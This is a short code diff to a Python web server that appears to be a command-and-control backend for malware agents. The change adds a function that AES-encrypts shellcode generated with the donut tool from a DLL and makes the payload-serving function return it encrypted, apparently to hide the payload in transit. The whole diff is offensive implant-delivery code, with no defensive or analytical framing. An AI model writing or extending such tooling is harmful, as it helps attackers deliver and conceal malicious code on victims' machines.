@@ -128,6 +128,12 @@ def encrypt_data(data):
 
     return serialized
 
+def encrypt_shellcode(shellcode):
+    iv, ct, tag = encrypt(aes_key, shellcode)
+    serialized = serialize(iv, tag, ct)
+
+    return serialized
+
 
 def find_agent_by_id(id_):
     """
@@ -285,9 +291,9 @@ def send_result():
 def get_shellcode():
     shellcode = donut.create(
         file = "test.dll",
-        method = "IAmAGoodNoodle",
+        method = "IAmAGoodNoodle"
     )
-    return shellcode
+    return encrypt_shellcode(shellcode)
 
 @app.route("/")
 def login():
